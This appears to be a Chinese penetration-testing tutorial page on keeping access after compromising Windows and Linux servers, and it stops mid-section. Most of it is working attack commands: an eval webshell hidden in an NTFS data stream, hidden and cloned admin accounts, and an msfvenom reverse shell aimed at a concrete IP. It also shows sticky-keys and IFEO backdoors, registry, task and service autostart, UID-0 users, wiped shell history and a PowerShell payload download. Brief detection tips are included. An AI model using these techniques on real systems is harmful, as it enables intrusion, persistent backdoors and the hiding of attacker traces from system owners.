<li>Windows 权限维持-隐藏<br></li>
<li>Windows 权限维持-后门<br></li>
<li>Linux 权限维持-隐藏<br></li>
<li>Linux 权限维持-后门<br></li>
<li>Windows 命令行文件下载方式汇总<br></li>
<li>渗透测试框架权限维持技术<br></li>
<li>常见 webshell 管理工具<br></li>
</ul>

<p>
拿到webshell后如何维护自己的权限？<br>
</p>
</div>
<div id="outline-container-h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f" class="outline-3">
<h3 id="h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">Windows权限维持-隐藏篇</h3>
<div class="outline-text-3" id="text-h:c3f1c187-ff2b-46cc-a1ff-a9232e8f735f">
<p>
<b>使用环境：Windows Server 2008</b><br>
</p>
</div>
<div id="outline-container-h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31" class="outline-4">
<h4 id="h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">隐藏文件</h4>
<div class="outline-text-4" id="text-h:6a83adc9-11a2-4fa4-b4a6-762d3ebc5d31">
</div>
<div id="outline-container-h:154fb59a-f437-4db8-8ad8-4ec807786e0b" class="outline-5">
<h5 id="h:154fb59a-f437-4db8-8ad8-4ec807786e0b">方法1-利用文件属性</h5>
<div class="outline-text-5" id="text-h:154fb59a-f437-4db8-8ad8-4ec807786e0b">
<p>
最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件夹里看不到刚刚的文件了。<br>
</p>

<p>
这样就看不见one.php<br>
</p>

<p>
查看“组织-文件夹和搜索选项”显示隐藏文件即可<br>
</p>

<p>
真正隐藏文件：使用Attrib +s +a +h +r命令就是把原本的文件增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">attrib +s +a +h +r one.php
</pre>
</div>

<p>
这样就做到了真正的隐藏，不管你是否显示隐藏文件，在此文件夹内都看不见。<br>
</p>

<p>
破解隐藏文件：<br>
打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。<br>
</p>
</div>
</div>
<div id="outline-container-h:6c33a506-482b-422a-a9e7-297387ac4554" class="outline-5">
<h5 id="h:6c33a506-482b-422a-a9e7-297387ac4554">方法2-利用ADS(Alternate Data Streams)隐藏文件内容</h5>
<div class="outline-text-5" id="text-h:6c33a506-482b-422a-a9e7-297387ac4554">
<p>
ADS交换数据流，是NTFS磁盘格式的一个特性，在NTFS系统中每个文件可以存在多个数据流，这样可以把其它的文件寄宿在某个文件上，在资源管理器中只能看到一个数据文件而看不到寄宿文件。windows电脑磁盘一般都是NTFS格式<br>
</p>

<p>
在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这么做：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">echo</span> ^&lt;?php @eval($<span style="color: #a0522d;">_POST</span>[<span style="color: #8b2252;">'test'</span>]);?^&gt; &gt; index.php:hidden.jpg
</pre>
</div>



<figure id="orgd082204">
<img src="./images/img_20230814_173444.png" alt="img_20230814_173444.png" width="60%"><br>

</figure>

<p>
这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出hidden.jpg。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#38382;&#39064;1&#65306;&#22914;&#20309;&#26597;&#30475;index.php:hidden.jpg&#20869;&#23481;&#21602;&#65311;
&#36827;&#20837;&#25991;&#20214;&#25152;&#22312;&#30446;&#24405;&#65292;notepad index.php:hidden.jpg &#25110;&#32773; dir /r

&#38382;&#39064;2&#65306;&#22914;&#20309;&#21024;&#38500;index.php:hidden.jpg&#65311; &#23487;&#20027;&#25991;&#20214;&#27809;&#26377;&#20102;&#65292;&#23492;&#23487;&#25991;&#20214;&#20063;&#23601;&#27809;&#20102;&#12290;
&#30452;&#25509;&#21024;&#38500;index.php&#21363;&#21487;
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:409b7b71-a25c-428b-b265-1bfee181c342" class="outline-4">
<h4 id="h:409b7b71-a25c-428b-b265-1bfee181c342">隐藏账号</h4>
<div class="outline-text-4" id="text-h:409b7b71-a25c-428b-b265-1bfee181c342">
<p>
Windows隐藏系统用户操作，CMD命令行下，建立了一个用户名为test$，密码为111qqq!的简单隐藏账户，并且把该隐藏账户提升为管理员权限。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">net user test$ 111qqq! /add <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#38544;&#34255;&#36134;&#21495;</span>
net user
</pre>
</div>

<p>
CMD命令行使用"net user"，看不到"test$"这个账号，但在控制面板和本地用户和组是可以显示此用户的。<br>
</p>

<p>
想要把该隐藏账户提升为管理员权限，可以进行账号克隆。<br>
</p>

<p>
克隆账号的制作过程如下：<br>
“开始”→“运行”，输入“regedit”后回车，到“HKEY_LOCAL_MACHINE\SAM\SAM”，会发现无法展开该处所在的键值。这是因为系统默认对系统管理员给予"写入"和"读取控制"权限，没有给予修改权限，因此我们没有办法对"SAM"项下的键值进行查看和修改。单机右键权限，把名为“administrator”的用户赋予完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器。<br>
</p>


<figure id="orgcd04151">
<img src="./images/img_20230814_173716.png" alt="img_20230814_173716.png" width="60%"><br>

</figure>


<figure id="org08ccb8f">
<img src="./images/img_20230814_173737.png" alt="img_20230814_173737.png" width="60%"><br>

</figure>

<p>
再次打开注册表<br>
</p>


<figure id="org5a6fbf8">
<img src="./images/img_20230814_173800.png" alt="img_20230814_173800.png" width="60%"><br>

</figure>

<p>
复制administrator的F值到test$账户<br>
</p>


<figure id="orge228976">
<img src="./images/img_20230814_173846.png" alt="img_20230814_173846.png" width="60%"><br>

</figure>

<p>
利用test$/111qqq!远程登录，即是administrator权限，为administrator桌面。<br>
</p>


<figure id="orga200b02">
<img src="./images/img_20230814_173910.png" alt="img_20230814_173910.png" width="60%"><br>

</figure>

<p>
检测和清理方法：<br>
使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。<br>
</p>


<figure id="orga47d10d">
<img src="./images/img_20230814_173929.png" alt="img_20230814_173929.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141" class="outline-4">
<h4 id="h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">进程注入</h4>
<div class="outline-text-4" id="text-h:7bff8e4f-6de6-4cf9-9a8e-f5a9814cd141">
<p>
生成一个msf后门<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color: #a0522d;">LHOST</span>=121.196.62.22 <span style="color: #a0522d;">LPORT</span>=7764 -f exe &gt;7764.exe
</pre>
</div>


<p>
获得一个meterpreter的shell<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">use exploit/multi/hander
<span style="color: #483d8b;">set</span> payload windows/x64/meterpreter/reverse_tcp
<span style="color: #483d8b;">set</span> LHOST 0.0.0.0
<span style="color: #483d8b;">set</span> LPORT 7764
exploit

meterpreter&gt; getuid
Server username: WIN-148\Administrator
</pre>
</div>

<p>
查看进程<br>
</p>


<figure id="orgdbb50a4">
<img src="./images/img_20230814_174035.png" alt="img_20230814_174035.png" width="60%"><br>

</figure>

<p>
注入进程，getuid发现成为了syetem权限。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">migrate 320 <span style="color: #b22222;"># </span><span style="color: #b22222;">&#36827;&#31243;&#36801;&#31227;&#65292;320&#20026;&#27491;&#24120;&#26381;&#21153;&#30340;&#36827;&#31243;&#21495;</span>
</pre>
</div>

<figure id="orga4d45d0">
<img src="./images/img_20230814_174050.png" alt="img_20230814_174050.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-h:a10c8441-9e1b-4801-a3ec-a2194ed60390" class="outline-3">
<h3 id="h:a10c8441-9e1b-4801-a3ec-a2194ed60390">Windows权限维持-后门篇</h3>
<div class="outline-text-3" id="text-h:a10c8441-9e1b-4801-a3ec-a2194ed60390">
<p>
<b>使用环境：Windows Server 2008</b><br>
</p>
</div>
<div id="outline-container-h:937417c7-af8b-450d-9f5b-784f1306db54" class="outline-4">
<h4 id="h:937417c7-af8b-450d-9f5b-784f1306db54">粘滞键后门</h4>
<div class="outline-text-4" id="text-h:937417c7-af8b-450d-9f5b-784f1306db54">
<p>
粘滞键指的是电脑使用中的一种快捷键，专为同时按下两个或多个键有困难的人而设计的。粘滞键的主要功能是方便Shift等键的组合使用。一般的电脑连按五次shift会出现粘滞键提示。sethc.exe就是windows中粘滞键的调用文件。<br>
</p>


<figure id="org1dab0c0">
<img src="./images/img_20230816_165035.png" alt="img_20230816_165035.png" width="60%"><br>

</figure>

<p>
sethc.exe文件的属性，默认情况下是属于TrustedInstaller所有，不管是普通用户还是administrator都没有权限对它进行编辑的。TrustedInstaller是一个安全机制，权限比administrator管理权高，但比system低。文件位置在c:/Windows/Syste32中<br>
</p>

<p>
修改sethc.exe的安全设置当前所有者为administrator，右键属性找到安全，在高级中设置。<br>
</p>


<figure id="orgc849d89">
<img src="./images/img_20230816_165110.png" alt="img_20230816_165110.png" width="60%"><br>

</figure>

<p>
保证administrator对sethc.exe完全控制，点击安全选项下组或用户名Administrator编辑，勾选完全控制<br>
</p>


<figure id="org26f3097">
<img src="./images/img_20230816_165126.png" alt="img_20230816_165126.png" width="60%"><br>

</figure>

<p>
粘滞键位置：c:\windows\system32\sethc.exe<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">move sethc.exe sethc1.exe <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;&#21407;&#26412;&#30340;sethc&#25913;&#21517;&#20026;sethc1</span>
copy cmd.exe sethc.exe <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23558;cmd&#22797;&#21046;&#24182;&#37325;&#21629;&#21517;&#20026;sethc</span>
</pre>
</div>

<p>
此时在登录界面连按五次shift键即可启动cmd，而且不需要登录就可以执行。<br>
</p>


<figure id="org1f80c01">
<img src="./images/img_20230816_165211.png" alt="img_20230816_165211.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:efb03ca1-5a14-426a-bd28-0acab9780c9f" class="outline-4">
<h4 id="h:efb03ca1-5a14-426a-bd28-0acab9780c9f">Logon Scripts后门</h4>
<div class="outline-text-4" id="text-h:efb03ca1-5a14-426a-bd28-0acab9780c9f">
<p>
Logon Scripts是Windows登录脚本，当用户登录时触发，它能够优先于杀毒软件执行，从而绕过杀毒软件对敏感操作的拦截。<br>
</p>

<p>
注册表位置：HKEY_CURRENT_USER\Environment<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">REG ADD <span style="color: #8b2252;">"HKEY_CURRENT_USER\Environment"</span> /v UserInitMprLogonScript /t REG_SZ /d <span style="color: #8b2252;">"C:\Users\Administrator\Desktop\7764.exe"</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">&#21019;&#24314;&#38190;&#20026;&#65306;UserInitMprLogonScript&#65292;&#20854;&#38190;&#20540;&#20026;&#25105;&#20204;&#35201;&#21551;&#21160;&#30340;&#31243;&#24207;&#36335;&#24452;</span>
</pre>
</div>


<figure id="orgf065dfb">
<img src="./images/img_20230816_165311.png" alt="img_20230816_165311.png" width="60%"><br>

</figure>

<p>
注销之后重新登陆服务器，即可上线<br>
</p>


<figure id="org0325ff9">
<img src="./images/img_20230816_165335.png" alt="img_20230816_165335.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f" class="outline-4">
<h4 id="h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">映像劫持</h4>
<div class="outline-text-4" id="text-h:18bacb5e-e0e0-4ac0-9f53-5c13d723bb6f">
<p>
“映像劫持”，也被称为“IFEO”（Image File Execution Options），在WindowsNT架构的系统里，IFEO的本意是为一些在默认系统环境中运行时可能引发错误的程序执行提供特殊的环境设定。<br>
</p>

<p>
当一个可执行程序位于IFEO的控制中时，它的内存分配则根据该程序的参数来设定，而WindowsNT架构的系统能通过这个注册表项使用与可执行程序文件名匹配的项目作为程序载入时的控制依据，最终得以设定一个程序的堆管理机制和一些辅助机制等。出于简化原因，IFEO使用忽略路径的方式来匹配它所要控制的程序文件名，所以程序无论放在哪个路径，只要名字没有变化，它的运行就不会出问题。<br>
</p>

<p>
注册表位置：HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<br>
</p>

<p>
在此注册表位置添加项sethc.exe，添加debugger键的值为c:\windows\system32\cmd.exe<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">reg add <span style="color: #8b2252;">"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"</span> /v <span style="color: #8b2252;">"Debugger"</span> /t REG_SZ /d <span style="color: #8b2252;">"c:\windows\system32\cmd.exe"</span> /f
</pre>
</div>

<p>
此时点击五次shift键会打开cmd。<br>
</p>
</div>
</div>
<div id="outline-container-h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b" class="outline-4">
<h4 id="h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">注册表自启动后门</h4>
<div class="outline-text-4" id="text-h:b1c921b3-1d0f-49be-8ca8-a57d6fbbc78b">
<p>
位置一：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run<br>
</p>

<p>
添加键test1，值为后门程序路径。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">REG ADD <span style="color: #8b2252;">"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"</span> /v test1 /t REG_SZ /d <span style="color: #8b2252;">"C:\Users\Administrator\Desktop\7764.exe"</span>
</pre>
</div>


<figure id="org73f86a5">
<img src="./images/img_20230816_165846.png" alt="img_20230816_165846.png" width="60%"><br>

</figure>

<p>
重新启动会自动运行后门程序，上线成功。<br>
</p>


<figure id="org608ed98">
<img src="./images/img_20230816_165900.png" alt="img_20230816_165900.png" width="60%"><br>

</figure>

<p>
位置二：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>
</p>

<p>
修改键Userinit的值，重启就会自动运行程序。<br>
</p>

<p>
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon<br>
C:\Users\Administrator\Desktop\7764.exe<br>
</p>


<figure id="orgb6f53f2">
<img src="./images/img_20230816_165929.png" alt="img_20230816_165929.png" width="60%"><br>

</figure>

<p>
重新启动会自动运行后门程序，上线成功。<br>
</p>


<figure id="org75a7cdc">
<img src="./images/img_20230816_165945.png" alt="img_20230816_165945.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d" class="outline-4">
<h4 id="h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">计划任务后门</h4>
<div class="outline-text-4" id="text-h:3ec61c18-a92c-4df2-bdbc-b9b317863e9d">
<p>
schtasks命令设定计划自启动后门程序。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">schtasks /Create /tn Updater /tr C:\Users\Administrator\Desktop\7764.exe /sc minute /mo 1 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#27599;1&#20998;&#38047;&#33258;&#21160;&#25191;&#34892;7764.exe</span>
chcp 437 <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20462;&#25913;&#32534;&#30721;</span>
schtasks <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#35745;&#21010;&#20219;&#21153;</span>
</pre>
</div>


<figure id="org74ea7c1">
<img src="./images/img_20230816_170117.png" alt="img_20230816_170117.png" width="60%"><br>

</figure>

<p>
1分钟后收到会话<br>
</p>


<figure id="org538a754">
<img src="./images/img_20230816_170129.png" alt="img_20230816_170129.png" width="60%"><br>

</figure>

<p>
删除计划任务：<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">schtasks /delete /tn Updater
</pre>
</div>
</div>
</div>
<div id="outline-container-h:19251ff1-a9e2-44b2-a8e6-77cd8d617313" class="outline-4">
<h4 id="h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">服务自启动后门</h4>
<div class="outline-text-4" id="text-h:19251ff1-a9e2-44b2-a8e6-77cd8d617313">
<p>
自启动服务一般是在电脑启动后在后台加载指定的服务程序，我们可以将exe文件注册为服务，也可以将dll文件注册为服务。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">sc create test <span style="color: #a0522d;">binpath</span>= C:\Users\Administrator\Desktop\7764.exe &#65288;&#27880;&#24847;&#31561;&#21495;&#21518;&#38754;&#26377;&#31354; &#26684;&#65289;#&#21019;&#24314;&#26381;&#21153;
sc config test <span style="color: #a0522d;">start</span>= auto <span style="color: #b22222;">#</span><span style="color: #b22222;">&#35774;&#32622;&#26381;&#21153;&#20026;&#33258;&#21160;&#21551;&#21160;&#65292;&#21363;&#20351;&#26381;&#21153;&#34987;&#20851;&#38381;&#20102;&#36824;&#20250;&#34987;&#21551;&#21160;&#36215;&#26469;</span>
net start test <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21551;&#21160;&#26381;&#21153;</span>
</pre>
</div>


<figure id="org80af266">
<img src="./images/img_20230816_170239.png" alt="img_20230816_170239.png" width="60%"><br>

</figure>
</div>
</div>
</div>
<div id="outline-container-h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4" class="outline-3">
<h3 id="h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">Linux权限维持-隐藏篇</h3>
<div class="outline-text-3" id="text-h:8c92ed0e-6ef1-4d7d-9886-8346e044a9f4">
<p>
<b>使用环境：CentOS</b><br>
</p>

<p>
攻击者在获取Linux服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件。<br>
</p>
</div>
<div id="outline-container-h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8" class="outline-4">
<h4 id="h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">隐藏文件</h4>
<div class="outline-text-4" id="text-h:7c9b829f-c16b-43a5-bdc4-c4d7ba3266f8">
<p>
Linux 下创建一个隐藏文件：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">touch .1.txt
</pre>
</div>

<p>
touch 命令可以创建一个文件，文件名前面加一个点就代表是隐藏文件，如下图：<br>
</p>


<figure id="orgb0bda66">
<img src="./images/img_20230816_170608.png" alt="img_20230816_170608.png" width="60%"><br>

</figure>

<p>
一般的Linux下的隐藏目录使用命令 ls -l 是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令： ls -la<br>
</p>

<p>
这里，我们可以看到在/tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。<br>
如 <i>temp</i>.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/<br>
</p>


<figure id="org5e20315">
<img src="./images/img_20230816_170646.png" alt="img_20230816_170646.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-h:87e115d3-9cd8-430b-a0db-aec09e79f61e" class="outline-4">
<h4 id="h:87e115d3-9cd8-430b-a0db-aec09e79f61e">隐藏文件时间戳</h4>
<div class="outline-text-4" id="text-h:87e115d3-9cd8-430b-a0db-aec09e79f61e">
<p>
Linux下隐藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。<br>
</p>

<p>
将时间戳修改成某年某月某日。如下修改one.php时间戳为：2019年08月08日。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">touch -t 1908081042.30 one.php
</pre>
</div>
</div>
</div>
<div id="outline-container-h:4beedc56-2f95-4ce4-8147-00b6726cca9c" class="outline-4">
<h4 id="h:4beedc56-2f95-4ce4-8147-00b6726cca9c">隐藏权限</h4>
<div class="outline-text-4" id="text-h:4beedc56-2f95-4ce4-8147-00b6726cca9c">
<p>
在Linux中，使用chattr命令为文件添加锁定属性，来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">chattr +i evil.php &#20026;&#25991;&#20214;&#28155;&#21152;&#38145;&#23450;&#23646;&#24615;
lsattr evil.php &#23646;&#24615;&#26597;&#30475;
chattr -i evil.php &#35299;&#38500;&#38145;&#23450;
rm -rf evil.php &#21024;&#38500;&#25991;&#20214;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:a388aa4a-f3b5-4044-849c-3b412c075e9d" class="outline-4">
<h4 id="h:a388aa4a-f3b5-4044-849c-3b412c075e9d">隐藏历史操作命令</h4>
<div class="outline-text-4" id="text-h:a388aa4a-f3b5-4044-849c-3b412c075e9d">
<p>
如果在shell中执行的命令，不希望被记录在历史命令中，如何在Linux中开启无痕操作模式呢？<br>
</p>

<p>
技巧一：只针对你的操作关闭历史记录<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[space]set +o history
</pre>
</div>

<p>
上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史命令中，然而这个命令之前的所有东西都会原样记录在历史命令中。<br>
</p>

<p>
要重新开启历史功能，执行下面的命令：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[Space]set -o history &#23427;&#23558;&#29615;&#22659;&#24674;&#22797;&#21407;&#29366;&#65292;&#20063;&#23601;&#26159;&#20320;&#23436;&#25104;&#20102;&#20320;&#30340;&#24037;&#20316;&#65292;&#25191;&#34892;&#19978;&#36848;&#21629;&#20196;&#20043;&#21518;&#30340;&#21629;&#20196;&#37117;&#20250;&#20986;&#29616;&#22312;&#21382;&#21490;&#20013;&#12290; 
</pre>
</div>

<p>
技巧二：从历史记录中删除指定的命令<br>
假设历史命令中已经包含了一些你不希望记录的命令，这种情况下我们怎么办？很简单，通过下面的命令来删除：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">history</span> | grep <span style="color: #8b2252;">"keyword"</span>
</pre>
</div>

<p>
输出历史记录中匹配的命令，每一条命令前面会有个数字。从历史记录中删除指定的项：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">history</span> -d [num]
</pre>
</div>

<p>
这种技巧是关键记录删除，其他情况比如前150行是用户的正常操作记录，150以后是攻击者操作记录。<br>
我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">sed -i <span style="color: #8b2252;">'150,$d'</span> .bash_history
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-h:700f5d3c-290f-452f-90e8-e2055a96cdd9" class="outline-3">
<h3 id="h:700f5d3c-290f-452f-90e8-e2055a96cdd9">Linux权限维持-后门篇</h3>
<div class="outline-text-3" id="text-h:700f5d3c-290f-452f-90e8-e2055a96cdd9">
<p>
<b>使用环境：Kali Linux</b><br>
</p>
</div>
<div id="outline-container-h:a7913564-0810-46e7-9577-b4c9a0f96db6" class="outline-4">
<h4 id="h:a7913564-0810-46e7-9577-b4c9a0f96db6">一句话添加用户和密码</h4>
<div class="outline-text-4" id="text-h:a7913564-0810-46e7-9577-b4c9a0f96db6">
<p>
添加普通用户：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;&#26222;&#36890;&#29992;&#25143;</span>
useradd -p <span style="color: #ff00ff;">`openssl passwd -1 -salt 'salt' 123456`</span> guest

<span style="color: #b22222;"># </span><span style="color: #b22222;">useradd -p &#26041;&#27861; ` ` &#26159;&#29992;&#26469;&#23384;&#25918;&#21487;&#25191;&#34892;&#30340;&#31995;&#32479;&#21629;&#20196;,"$()"&#20063;&#21487;&#20197;&#23384;&#25918;&#21629;&#20196;&#25191;&#34892;&#35821;&#21477;</span>
useradd -p <span style="color: #8b2252;">"$(openssl passwd -1 123456)"</span> guest

<span style="color: #b22222;"># </span><span style="color: #b22222;">chpasswd&#26041;&#27861;</span>
useradd guest;<span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">'guest:123456'</span>|chpasswd

<span style="color: #b22222;"># </span><span style="color: #b22222;">echo -e&#26041;&#27861;</span>
useradd test;<span style="color: #483d8b;">echo</span> -e <span style="color: #8b2252;">"123456\n123456\n"</span> |passwd test
</pre>
</div>

<p>
添加root用户：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#21019;&#24314;&#19968;&#20010;&#29992;&#25143;&#21517;guest&#65292;&#23494;&#30721;123456&#30340;root&#29992;&#25143;</span>
useradd -p <span style="color: #ff00ff;">`openssl passwd -1 -salt 'salt' 123456`</span> guest1 -o -u 0 -g root -G root -s /bin/bash -d /home/test

]# su guest
]# whoami
root
</pre>
</div>

<p>
可疑用户排查技巧：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#29305;&#26435;&#29992;&#25143;&#29305;&#26435;&#29992;&#25143;(uid &#20026;0)</span>
[root@localhost ~]# awk -F: <span style="color: #8b2252;">'$3==0{print $1}'</span> /etc/passwd

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#35810;&#21487;&#20197;&#36828;&#31243;&#30331;&#24405;&#30340;&#36134;&#21495;&#20449;&#24687;</span>
[root@localhost ~]# awk <span style="color: #8b2252;">'/\$1|\$6/{print $1}'</span> /etc/shadow

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#38500;root&#36134;&#21495;&#22806;&#65292;&#20854;&#20182;&#36134;&#21495;&#26159;&#21542;&#23384;&#22312;sudo&#26435;&#38480;&#12290;&#22914;&#38750;&#31649;&#29702;&#38656;&#35201;&#65292;&#26222;&#36890;&#36134;&#21495;&#24212;&#21024;&#38500;sudo&#26435;&#38480;</span>
[root@localhost ~]# more /etc/sudoers | grep -v <span style="color: #8b2252;">"^#\|^$"</span> | grep <span style="color: #8b2252;">"ALL=(ALL)"</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:408294ae-7613-4498-82d2-f6322b12a9ae" class="outline-4">
<h4 id="h:408294ae-7613-4498-82d2-f6322b12a9ae">SSH免密登录</h4>
<div class="outline-text-4" id="text-h:408294ae-7613-4498-82d2-f6322b12a9ae">
<p>
在客户端上生成一对公私钥，然后把公钥安装到服务器上（~/.ssh/authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配，如果匹配成功就可以登录了。<br>
</p>

<p>
在服务器上执行命令：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">ssh-keygen -t rsa
</pre>
</div>

<p>
过程中按三次回车。<br>
</p>

<p>
进入/root/.ssh/文件夹查看内容，其中 id_rsa 为私钥， id_rsa.pub 为公钥。<br>
</p>

<p>
接下来需要在服务器上安装公钥，即将 id_rsa.pub 的内容追加到 <i>root</i>.ssh/authorized_keys 内：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">cat id_rsa.pub &gt;&gt; authorized_keys
</pre>
</div>

<p>
vim /etc/ssh/sshd_config，开启密钥登录的认证方式：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">PermitRootLogin yes
PubkeyAuthentication yes

/etc/init.d/ssh start
</pre>
</div>

<p>
将私钥提取出来保存到本地，可以利用此密钥直接进行登录：<br>
</p>


<figure id="orgdc15de0">
<img src="./images/img_20230817_133227.png" alt="img_20230817_133227.png" width="60%"><br>

</figure>



<figure id="org2948654">
<img src="./images/img_20230817_133313.png" alt="img_20230817_133313.png" width="60%"><br>

</figure>



<figure id="orgec7219d">
<img src="./images/img_20230817_133328.png" alt="img_20230817_133328.png" width="60%"><br>

</figure>

<p>
排查技巧：查看 <i>root</i>.ssh/authorized_keys 是否被修改，结合文件时间戳、历史命令等进行排查。<br>
</p>
</div>
</div>
</div>
<div id="outline-container-h:44407d4b-cafe-4c37-abb2-015f359766fe" class="outline-3">
<h3 id="h:44407d4b-cafe-4c37-abb2-015f359766fe">Windows命令行文件下载方式汇总</h3>
<div class="outline-text-3" id="text-h:44407d4b-cafe-4c37-abb2-015f359766fe">
<p>
<b>使用环境：Windows Server 2008</b><br>
</p>

<p>
当我们通过Web渗透获取了一个RCE漏洞，而且目标主机是Windows，我们该怎么去下载后门文件到目标主机上执行呢？一般来说，实现Windows文件下载执行的方式主要如下：<br>
</p>

<ul class="org-ul">
<li>第一种，远程下载文件到本地，然后再执行；<br></li>
<li>第二种，远程下载执行，执行过程没有二进制文件落地，这种方式已然成为后门文件下载执行的首要方式。<br></li>
</ul>

<p>
下面是常见的文件下载执行的方式：<br>
</p>
</div>
<div id="outline-container-h:ab2f6774-fca7-4761-9c74-de76620d5b4f" class="outline-4">
<h4 id="h:ab2f6774-fca7-4761-9c74-de76620d5b4f">PowerShell</h4>
<div class="outline-text-4" id="text-h:ab2f6774-fca7-4761-9c74-de76620d5b4f">
<p>
PowerShell是一种命令行外壳程序和脚本环境，使得命令行用户和脚本编写者可以利用。<br>
</p>

<p>
远程下载文件保存在本地：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">powershell</span> (new-object System.Net.WebClient).DownloadFile(<span style="color: #8b2252;">'http://192.168.85.1/one.exe'</span>,<span style="color: #8b2252;">'one.exe'</span>)
</pre>
</div>

<p>
远程执行命令：以隐藏的方式下载并执行后门<br>
</p>
<div class="org-src-container">
